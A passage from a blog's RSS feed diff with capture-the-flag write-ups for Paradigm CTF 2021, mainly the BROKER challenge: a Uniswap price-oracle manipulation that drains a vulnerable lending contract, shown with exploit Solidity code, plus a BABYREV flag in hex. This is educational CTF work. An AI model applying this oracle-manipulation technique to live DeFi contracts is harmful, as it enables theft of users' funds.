+t_str = hex&amp;quot;504354467b763332795f3533637532335f336e633279703731306e5f34313930323137686d7d&amp;quot;
+
+&#x2F;&#x2F; Weird String
+b_str = hex&amp;quot;311dfa5451963f33b16e63f0c62278c9b907e43d1961cdf9f590a0c3b351c04019cccb831403&amp;quot;
+
+weird = C
+
+for (i = 0; i &amp;lt; len(b_str); i++) {
+    weird_byte = weird &amp;amp;&amp;amp; 0xff
+    b_str[i] ^= weird_byte
+
+    new_weird = 0x00
+    for (j = 0; j &amp;lt; 32 * 8; j += 8) {
+        offset = (weird &amp;gt;&amp;gt; j) &amp;amp;&amp;amp; 0xff
+        elem = a_arr[offset]
+        new_weird |= elem &amp;lt;&amp;lt; j          &#x2F;&#x2F; add elem byte to the left
+    }
+    weird = (new_weird &amp;amp;&amp;amp; 0xff) &amp;lt;&amp;lt; 31 * 8 | new_weird &amp;gt;&amp;gt; 8
+}
+
+target_hash = sha3(t_str)
+our_hash = sha3(b_str)
+
+if (target_hash == our_hash) {
+    &#x2F;&#x2F; Win the thing!
+    storage[0x00] = (storage[0x00] &amp;amp; ~0xFF) | 0x01;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The key takeaway here is that each byte of &lt;code&gt;b_str&lt;&#x2F;code&gt; gets overwritten with itself xor&#x27;d with the least significant byte of &lt;code&gt;weird&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;computing-c-a-rope-of-sand&quot;&gt;Computing &lt;code&gt;C&lt;&#x2F;code&gt;: A Rope of Sand&lt;&#x2F;h4&gt;
+&lt;p&gt;Now that we know &lt;em&gt;how&lt;&#x2F;em&gt; &lt;code&gt;C&lt;&#x2F;code&gt; is used, we need to find a concrete value for &lt;code&gt;C&lt;&#x2F;code&gt; that correctly decodes &lt;code&gt;b_str&lt;&#x2F;code&gt;. Python to the rescue!&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#65737e;&quot;&gt;# This is where I&amp;#39;ll put the Python tool when I get it from @adietrichs
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Because of the way this hash function is constructed, it is possible to isolate each byte of the input value, one at a time. If this were a real hash function (like SHA-3), there&#x27;d be mixing between the bytes, making this process practically impossible.&lt;&#x2F;p&gt;
+&lt;p&gt;Now that we know &lt;code&gt;C&lt;&#x2F;code&gt;, we can craft the attack transaction, and solve the challenge.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h1&gt;
+&lt;p&gt;This concludes my mini-series on Paradigm&#x27;s CTF competition. Thanks for sticking it out, and I hope you enjoyed it.&lt;&#x2F;p&gt;
+&lt;p&gt;If you&#x27;d like to see some of our team&#x27;s other solutions, check out:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;smarx.com&#x2F;posts&#x2F;2021&#x2F;02&#x2F;writeup-of-paradigm-ctf-bank&#x2F;&quot;&gt;BANK&lt;&#x2F;a&gt; by &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;smarx&quot;&gt;@smarx&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;smarx.com&#x2F;posts&#x2F;2021&#x2F;02&#x2F;writeup-of-paradigm-ctf-vault&#x2F;&quot;&gt;VAULT&lt;&#x2F;a&gt; also by &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;smarx&quot;&gt;@smarx&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;JOP &lt;a href=&quot;https:&#x2F;&#x2F;www.twitch.tv&#x2F;videos&#x2F;907645638&quot;&gt;Part 1&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;www.twitch.tv&#x2F;videos&#x2F;906353891&quot;&gt;Part 2&lt;&#x2F;a&gt; (solved after the competition) by &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@adietrichs&#x2F;paradigm-ctf-2021&quot;&gt;UPGRADE&lt;&#x2F;a&gt; by &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;A huge thank you to Paradigm for putting this whole thing together. It was a blast!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;footnotes&quot;&gt;Footnotes&lt;&#x2F;h2&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
+&lt;p&gt;&lt;em&gt;Ethereum Virtual Machine&lt;&#x2F;em&gt;, the abstract computer simulated by Ethereum, that Solidity targets.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;2&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;2&lt;&#x2F;sup&gt;
+&lt;p&gt;It is infeasible to recover the function signature given the selector, but &lt;a href=&quot;https:&#x2F;&#x2F;www.4byte.directory&#x2F;&quot;&gt;4byte.directory&lt;&#x2F;a&gt; provides a public database mapping selectors to known signatures.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;3&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;3&lt;&#x2F;sup&gt;
+&lt;p&gt;Likely intentional on the puzzlesmith&#x27;s part!&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;4&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;4&lt;&#x2F;sup&gt;
+&lt;p&gt;No matter how much you want it to be.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;5&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;5&lt;&#x2F;sup&gt;
+&lt;p&gt;&lt;em&gt;I&lt;&#x2F;em&gt; called this &lt;code&gt;ACC&lt;&#x2F;code&gt; (for accumulator), but &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt;&#x27; &lt;code&gt;weird&lt;&#x2F;code&gt; won out in the end. What do you want? It&#x27;s a weird number.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>BROKER Challenge - Paradigm CTF (Part 2 of 3)</title>
+                <pubDate>Sun, 14 Feb 2021 19:28:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/paradigm-ctf-broker/</link>
+                <guid>https://binarycake.ca/posts/paradigm-ctf-broker/</guid>
+                <description>&lt;style&gt;
+pre {
+line-height: 1.3em !important;
+}
+&lt;&#x2F;style&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h2&gt;
+&lt;p&gt;In my &lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;paradigm-ctf&#x2F;&quot;&gt;previous post&lt;&#x2F;a&gt;, I gave a short summary of the BABYCRYPTO challenge from Paradigm&#x27;s recent Capture the Flag competition. This time around, I&#x27;ll be walking through the BROKER challenge, which &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;lightclients&quot;&gt;@lightclients&lt;&#x2F;a&gt; and I solved together. If you&#x27;d like more details on the competition or the format of the challenges, go and give my &lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;paradigm-ctf&#x2F;&quot;&gt;previous post&lt;&#x2F;a&gt; a read first.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;challenges&quot;&gt;Challenges&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;broker&quot;&gt;BROKER&lt;&#x2F;h3&gt;
+&lt;p&gt;After BABYCRYPTO, I joined &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;lightclients&quot;&gt;@lightclients&lt;&#x2F;a&gt; on the BROKER challenge:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;broker.png&quot; alt=&quot;This broker has pretty good rates&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;From the description, we initially assumed this challenge would have something to do with either a logic error in a contract, or some sort of market manipulation. Here&#x27;s what was in the archive:&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;.&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+└── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;broker&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+    └── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;public&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        ├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;contracts&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        │   ├── Broker.sol
+        │   └── Setup.sol
+        ├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;deploy&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        │   ├── chal.py
+        │   ├── compiled.bin
+        │   └── requirements.txt
+        └── Dockerfile
+&lt;&#x2F;pre&gt;
+&lt;p&gt;This format, which differed from BABYCRYPTO, was the same for all of the other challenges: &lt;code&gt;chal.py&lt;&#x2F;code&gt; did some magic to spin up a test chain (either &lt;code&gt;ganache&lt;&#x2F;code&gt; or &lt;code&gt;hardhat&lt;&#x2F;code&gt;) and then would check &lt;a href=&quot;.&#x2F;Setup.sol&quot;&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; before releasing the flag.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;win-condition&quot;&gt;Win Condition&lt;&#x2F;h4&gt;
+&lt;p&gt;Let&#x27;s take a look at the win condition for BROKER to narrow down what we&#x27;re looking for:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function isSolved() public view returns (bool) {
+    return weth.balanceOf(address(broker)) &amp;lt; 5 ether;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In other words, we&#x27;re looking to reduce the Wrapped ETH (aka. &lt;a href=&quot;https:&#x2F;&#x2F;weth.io&#x2F;&quot;&gt;&lt;code&gt;weth&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;, an ERC-20 representing ETH) balance of some address &lt;code&gt;broker&lt;&#x2F;code&gt; to less than five ether.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;environment&quot;&gt;Environment&lt;&#x2F;h4&gt;
+&lt;p&gt;The &lt;code&gt;Setup.sol&lt;&#x2F;code&gt; contract gives us quite a bit of information about the chain and the contracts we&#x27;ll have at our disposal. Starting with the first two constants in &lt;code&gt;Setup&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;What immediately sticks out is that we have an &lt;a href=&quot;https:&#x2F;&#x2F;uniswap.org&#x2F;docs&#x2F;v2&#x2F;smart-contracts&#x2F;factory&#x2F;&quot;&gt;&lt;code&gt;IUniswapV2Factory&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; deployed at &lt;a href=&quot;https:&#x2F;&#x2F;etherscan.io&#x2F;address&#x2F;0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f&quot;&gt;&lt;code&gt;0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;. That&#x27;s the same address as Uniswap on mainnet, implying we&#x27;re running on a fork of mainnet! That gives us a &lt;em&gt;ton&lt;&#x2F;em&gt; of tools like flashloans, the rest of Uniswap, and pretty much anything else you can think of. Great. The &lt;code&gt;weth&lt;&#x2F;code&gt; address also matches the mainnet token, so we have twice the confirmation&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;That&#x27;s not all &lt;code&gt;Setup.sol&lt;&#x2F;code&gt; has to offer. We&#x27;ve got a mysterious &lt;code&gt;Token&lt;&#x2F;code&gt; contract, with an &lt;code&gt;airdrop&lt;&#x2F;code&gt; function:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function airdrop() public {
+    require(!dropped[msg.sender], &amp;quot;err: only once&amp;quot;);
+    dropped[msg.sender] = true;
+    balanceOf[msg.sender] += AMT;
+    totalSupply += AMT;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we can get our dirty degen hands on some tokens! What does the token have to do with Uniswap? Well, the setup creates a Uniswap trading pair:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Then it adds an initial liquidity pool between WETH and our magical token:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&#x2F;&#x2F; 1:25
+weth.transfer(address(pair), 25 ether);
+token.transfer(address(pair), 500_000 * DECIMALS);
+pair.mint(address(this));
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So, to summarize:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;We&#x27;re on a fork of mainnet, and have access to all the wonderful finance tools therein.&lt;&#x2F;li&gt;
+&lt;li&gt;We have a magical token (MagicToken from now on.)&lt;&#x2F;li&gt;
+&lt;li&gt;We can get a fat stack of MagicToken, but only once.&lt;&#x2F;li&gt;
+&lt;li&gt;We have a Uniswap pair that can trade WETH for MagicToken.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h5 id=&quot;aside-what-is-uniswap&quot;&gt;Aside: What is Uniswap?&lt;&#x2F;h5&gt;
+&lt;p&gt;I&#x27;m not going to pretend to be an expert on Uniswap. There &lt;a href=&quot;https:&#x2F;&#x2F;uniswap.org&#x2F;docs&#x2F;v2&#x2F;protocol-overview&#x2F;how-uniswap-works&#x2F;&quot;&gt;are&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=Ui1TBPdnEJU&quot;&gt;much&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;docs.ethhub.io&#x2F;guides&#x2F;graphical-guide-for-understanding-uniswap&#x2F;&quot;&gt;better&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;academy.binance.com&#x2F;en&#x2F;articles&#x2F;what-is-uniswap-and-how-does-it-work&quot;&gt;places&lt;&#x2F;a&gt; to learn about its many intricate details. Here&#x27;s what I understand about Uniswap and what ended up being relevant to this challenge:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Uniswap is a decentralized exchange where users can swap between pairs of tokens.&lt;&#x2F;li&gt;
+&lt;li&gt;Each trading pair is represented by an on-chain contract with the &lt;code&gt;IUniswapV2Pair&lt;&#x2F;code&gt; interface.&lt;&#x2F;li&gt;
+&lt;li&gt;The pair contract maintains a balance of each token.&lt;&#x2F;li&gt;
+&lt;li&gt;The exchange rate between tokens in a pair is determined by the ratio of the contract&#x27;s balance of each token (something like &lt;code&gt;token0.balanceOf(pair) &#x2F; token1.balanceOf(pair)&lt;&#x2F;code&gt;.)&lt;&#x2F;li&gt;
+&lt;li&gt;Finally, the most important: &lt;strong&gt;swapping one token for the other changes the ratio, and therefore changes the exchange rate&lt;&#x2F;strong&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;target&quot;&gt;Target&lt;&#x2F;h4&gt;
+&lt;p&gt;Here is the &lt;code&gt;Broker&lt;&#x2F;code&gt; contract from &lt;a href=&quot;.&#x2F;Broker.sol&quot;&gt;&lt;code&gt;Broker.sol&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&#x2F;&#x2F; a simple overcollateralized loan bank which accepts WETH as collateral and a
+&#x2F;&#x2F; token for borrowing. 0% APRs
+contract Broker {
+    IUniswapV2Pair public pair;
+    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    ERC20Like public token;
+
+
+    mapping(address =&amp;gt; uint256) public deposited;
+    mapping(address =&amp;gt; uint256) public debt;
+
+    constructor (IUniswapV2Pair _pair, ERC20Like _token) {
+        pair = _pair;
+        token = _token;
+    }
+
+    function rate() public view returns (uint256) {
+        (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();
+        uint256 _rate = uint256(_reserve0 &#x2F; _reserve1);
+        return _rate;
+    }
+
+    function safeDebt(address user) public view returns (uint256) {
+        return deposited[user] * rate() * 2 &#x2F; 3;
+    }
+
+    &#x2F;&#x2F; borrow some tokens
+    function borrow(uint256 amount) public {
+        debt[msg.sender] += amount;
+        require(safeDebt(msg.sender) &amp;gt;= debt[msg.sender], &amp;quot;err: undercollateralized&amp;quot;);
+        token.transfer(msg.sender, amount);
+    }
+
+    &#x2F;&#x2F; repay your loan
+    function repay(uint256 amount) public {
+        debt[msg.sender] -= amount;
+        token.transferFrom(msg.sender, address(this), amount);
+    }
+
+    &#x2F;&#x2F; repay a user&amp;#39;s loan and get back their collateral. no discounts.
+    function liquidate(address user, uint256 amount) public returns (uint256) {
+        require(safeDebt(user) &amp;lt;= debt[user], &amp;quot;err: overcollateralized&amp;quot;);
+        debt[user] -= amount;
+        token.transferFrom(msg.sender, address(this), amount);
+        uint256 collateralValueRepaid = amount &#x2F; rate();
+        weth.transfer(msg.sender, collateralValueRepaid);
+        return collateralValueRepaid;
+    }
+
+    &#x2F;&#x2F; top up your collateral
+    function deposit(uint256 amount) public {
+        deposited[msg.sender] += amount;
+        weth.transferFrom(msg.sender, address(this), amount);
+    }
+
+    &#x2F;&#x2F; remove collateral
+    function withdraw(uint256 amount) public {
+        deposited[msg.sender] -= amount;
+        require(safeDebt(msg.sender) &amp;gt;= debt[msg.sender], &amp;quot;err: undercollateralized&amp;quot;);
+
+        weth.transfer(msg.sender, amount);
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;From the comment and code, we can figure out how this contract is supposed to work:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;You &lt;code&gt;deposit&lt;&#x2F;code&gt; some amount of WETH into the &lt;code&gt;Broker&lt;&#x2F;code&gt; contract, to use as collateral later on.&lt;&#x2F;li&gt;
+&lt;li&gt;You &lt;code&gt;borrow&lt;&#x2F;code&gt; some amount of MagicToken, limited by how much collateral you&#x27;ve deposited (calculated in &lt;code&gt;safeDebt&lt;&#x2F;code&gt;.)&lt;&#x2F;li&gt;
+&lt;li&gt;Any number of:
+&lt;ol&gt;
+&lt;li&gt;You &lt;code&gt;repay&lt;&#x2F;code&gt; some&#x2F;all of your debt, in MagicTokens.&lt;&#x2F;li&gt;
+&lt;li&gt;You &lt;code&gt;withdraw&lt;&#x2F;code&gt; collateral, limited by how much you have borrowed (calculated by &lt;code&gt;safeDebt&lt;&#x2F;code&gt; again.)&lt;&#x2F;li&gt;
+&lt;li&gt;Your &lt;code&gt;safeDebt&lt;&#x2F;code&gt; value falls below your current debt, and someone &lt;code&gt;liquidate&lt;&#x2F;code&gt;s your position.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h4 id=&quot;the-attack&quot;&gt;The Attack&lt;&#x2F;h4&gt;
+&lt;h5 id=&quot;inception&quot;&gt;Inception&lt;&#x2F;h5&gt;
+&lt;p&gt;Armed with the information above, we can start sketching out our attack:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;We need to drop the &lt;code&gt;Broker&lt;&#x2F;code&gt;&#x27;s WETH balance below 5 ether.&lt;&#x2F;li&gt;
+&lt;li&gt;The &lt;code&gt;Broker&lt;&#x2F;code&gt; sends WETH in two places: &lt;code&gt;withdraw&lt;&#x2F;code&gt; and &lt;code&gt;liquidate&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;withdraw&lt;&#x2F;code&gt; is pretty simple, so isn&#x27;t a likely target for exploit.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;liquidate&lt;&#x2F;code&gt; calls into &lt;code&gt;safeDebt&lt;&#x2F;code&gt; &lt;strong&gt;and&lt;&#x2F;strong&gt; &lt;code&gt;rate&lt;&#x2F;code&gt;! This is a likely target.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h5 id=&quot;toolbox&quot;&gt;Toolbox&lt;&#x2F;h5&gt;
+&lt;p&gt;What can we manipulate in &lt;code&gt;liquidate&lt;&#x2F;code&gt;? We have access to:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Amount deposited (&lt;code&gt;deposit&lt;&#x2F;code&gt; &#x2F; &lt;code&gt;withdraw&lt;&#x2F;code&gt;),&lt;&#x2F;li&gt;
+&lt;li&gt;Amount borrowed (&lt;code&gt;borrow&lt;&#x2F;code&gt; &#x2F; &lt;code&gt;repay&lt;&#x2F;code&gt;), and&lt;&#x2F;li&gt;
+&lt;li&gt;Ratio (&lt;code&gt;rate&lt;&#x2F;code&gt;) between WETH and MagicToken (by buying or selling on Uniswap).&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h5 id=&quot;instructions&quot;&gt;Instructions&lt;&#x2F;h5&gt;
+&lt;p&gt;So here&#x27;s our attack strategy:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Increase &lt;code&gt;rate()&lt;&#x2F;code&gt; as much as possible, by buying up, uh, &lt;code&gt;token1&lt;&#x2F;code&gt; and&#x2F;or selling &lt;code&gt;token0&lt;&#x2F;code&gt;?&lt;&#x2F;li&gt;
+&lt;li&gt;Deposit some collateral.&lt;&#x2F;li&gt;
+&lt;li&gt;Borrow a bunch of MagicTokens.&lt;&#x2F;li&gt;
+&lt;li&gt;Crash &lt;code&gt;rate()&lt;&#x2F;code&gt; by selling &lt;code&gt;token1&lt;&#x2F;code&gt; and&#x2F;or buying &lt;code&gt;token0&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;Liquidate our own position, extracting WETH from the contract.&lt;&#x2F;li&gt;
+&lt;li&gt;Repeat!&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h5 id=&quot;difficulties&quot;&gt;Difficulties&lt;&#x2F;h5&gt;
+&lt;p&gt;There are a couple issues here that I didn&#x27;t quite realize until later on. Which token is the numerator and which is the denominator in &lt;code&gt;rate()&lt;&#x2F;code&gt;? How do you even make a trade on Uniswap?&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;the-exploit-attempt-1&quot;&gt;The Exploit (Attempt #1)&lt;&#x2F;h4&gt;
+&lt;p&gt;We (or rather, I) charged ahead and wrote an &lt;a href=&quot;.&#x2F;Exploit.sol&quot;&gt;exploit contract&lt;&#x2F;a&gt;. I don&#x27;t mind taking all of the credit for this abomination because, spoiler alert, it didn&#x27;t work.&lt;&#x2F;p&gt;
+&lt;p&gt;Here are the most relevant bits:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;contract Exploit {
+    IERC20 immutable token0;
+    IERC20 immutable token1;
+
+    IUniswapV2PairReal immutable pair;
+    Broker immutable broker;
+
+    Token immutable token;
+    WETH9 immutable weth;
+
+    &#x2F;&#x2F; The Uniswap router contract exposes some higher level APIs for doing a swap.
+    &#x2F;&#x2F; Instead of figuring out how to invoke the pair directly, I used the router.
+    IUniswapV2Router02 constant router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+
+    constructor(Setup setup) payable {
+        &#x2F;&#x2F; Collect some useful addresses.
+        IUniswapV2PairReal _pair = IUniswapV2PairReal(address(setup.pair()));
+        Token _token = setup.token();
+        IERC20 _token0 = IERC20(_pair.token0());
+        IERC20 _token1 = IERC20(_pair.token1());
+        Broker _broker = setup.broker();
+        WETH9 _weth = setup.weth();
+
+        &#x2F;&#x2F; Mint ourselves some WETH to use later on.
+        _weth.deposit{value: msg.value}();
+
+        &#x2F;&#x2F; Get some of that sweet MagicToken airdropped.
+        _token.airdrop();
+
+        &#x2F;&#x2F; Flail around approving every combination of token and operator!
+        _token0.approve(address(router), type(uint256).max);
+        _token0.approve(address(_broker), type(uint256).max);
+
+        _token1.approve(address(router), type(uint256).max);
+        _token1.approve(address(_broker), type(uint256).max);
+
+        &#x2F;&#x2F; Store some constants for later.
+        weth = _weth;
+        token0 = _token0;
+        token1 = _token1;
+        pair = _pair;
+        broker = _broker;
+        token = _token;
+    }
+
+    function run() external {
+        &#x2F;&#x2F; Figure out how much of token0 we have.
+        uint256 t0Balance = token0.balanceOf(address(this));
+
+        &#x2F;&#x2F; Prepare the &amp;quot;route&amp;quot; we need to trade through to swap token0 for token1.
+        address[] memory path = new address[](2);
+        path[0] = address(token0);
+        path[1] = address(token1);
+
+        &#x2F;&#x2F; Do the exchange!
+        &#x2F;&#x2F; I only used half of our balance of token0 because we needed some left over for later.
+        router.swapExactTokensForTokens(t0Balance &#x2F; 2, 1, path, address(this), type(uint256).max);
+
+        &#x2F;&#x2F; Deposit collateral, again only using half in case we needed more.
+        uint256 wBalance = weth.balanceOf(address(this));
+        broker.deposit(wBalance &#x2F; 2);
+
+        &#x2F;&#x2F; Borrow as much MagicToken as we can!
+        uint256 borrowed = broker.safeDebt(address(this));
+        broker.borrow(borrowed);
+
+        &#x2F;&#x2F; Get our balance of token1 to swap it back
+        uint256 t1Balance = token1.balanceOf(address(this));
+
+        &#x2F;&#x2F; Invert the route
+        (path[0], path[1]) = (path[1], path[0]);
+
+        &#x2F;&#x2F; Swap!
+        router.swapExactTokensForTokens(t1Balance - borrowed, 1, path, address(this), type(uint256).max);
+
+        &#x2F;&#x2F; Liquidate ourselves.
+        broker.liquidate(address(this), borrowed);
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;&lt;h4 id=&quot;the-exploit-attempt-2&quot;&gt;The Exploit (Attempt #2)&lt;&#x2F;h4&gt;
+&lt;p&gt;Now, obviously, this didn&#x27;t work. Why? I never bothered to find out. To debug the contract, we set up Remix so we could access all the relevant parts. We had buttons to swap. We had buttons to borrow. We had so many buttons we didn&#x27;t know what to do with them all.&lt;&#x2F;p&gt;
+&lt;p&gt;We manually went through the steps in the contract. First manipulating the pair to raise &lt;code&gt;safeDebt&lt;&#x2F;code&gt;, then we deposited and borrowed, swapped the tokens back, and then called &lt;code&gt;liquidate&lt;&#x2F;code&gt;. The contract sent us WETH. Its balance had dropped. We rejoiced, and repeated the process. I wish I could say we were methodical or principled in our approach, but honestly we just swapped progressively smaller amounts until we eventually dropped the broker below the goal.&lt;&#x2F;p&gt;
+&lt;p&gt;So children, it turns out you don&#x27;t need a fancy exploit, all you need is Remix, about a million buttons, and a dream.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h1&gt;
+&lt;p&gt;That&#x27;s another one down! My next post will be on the BABYREV challenge, which was about 1% reverse engineering and 99% perseverance.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;footnotes&quot;&gt;Footnotes&lt;&#x2F;h2&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
+&lt;p&gt;As it turns out, most (and likely all) of the eth challenges were forked off of mainnet.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>BABYCRYPTO Challenge - Paradigm CTF (Part 1 of 3)</title>
+                <pubDate>Fri, 12 Feb 2021 22:45:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/paradigm-ctf/</link>
+                <guid>https://binarycake.ca/posts/paradigm-ctf/</guid>
+                <description>&lt;style&gt;
+pre {
+line-height: 1.3em !important;
+}
+&lt;&#x2F;style&gt;
